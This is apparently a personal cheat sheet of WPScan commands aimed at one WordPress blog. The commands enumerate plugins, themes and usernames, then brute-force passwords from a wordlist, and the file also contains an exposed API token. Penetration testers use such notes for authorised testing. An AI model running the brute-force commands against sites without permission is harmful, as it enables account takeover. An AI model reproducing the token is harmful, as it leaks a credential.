# WPScan

## Enumeraion

```bash
# Enumerate all plugins with known vulnerabilities
## baseline
wpscan --url https://blog.onevasco.com -e vp --plugins-detection mixed --api-token zBsi404GGCMKGzTraiEsSsQsFXCsUVWmaDUsn3EPuKc

## deep scan
wpscan --url https://blog.onevasco.com -e ap --plugins-detection aggressive

# Enumerate all plugins in our database (could take a very long time)
wpscan --url https://blog.onevasco.com -e ap --plugins-detection mixed --api-token zBsi404GGCMKGzTraiEsSsFXCsUVWmaDUsn3EPuKc

# Enumerate theme
wpscan --url https://blog.onevasco.com --enumerate t 

# Enumerate plugin
wpscan --url https://blog.onevasco.com --enumerate p
wpscan --url https://blog.onevasco.com --enumerate ap

# Enumerating usernames
wpscan --url https://blog.onevasco.com --enumerate u 

# Enumerating a range of usernames
wpscan --url https://blog.onevasco.com --enumerate u1-100


# Enumerate vuln plugin,plugni,theme,user
wpscan --url https://blog.onevasco.com --enumerate vp,p,t,u

# Password brute force attack
wpscan --url https://blog.onevasco.com -e u --passwords /wordlists/SecLists/password/Common-Credentials/best1050.txt

# BruteForce degna usernme telah di ketahui
wpscan --url https://blog.onevasco.com --usernames ovauthor --passwords /wordlists/SecLists/password/Common-Credentials/best1050.txt
```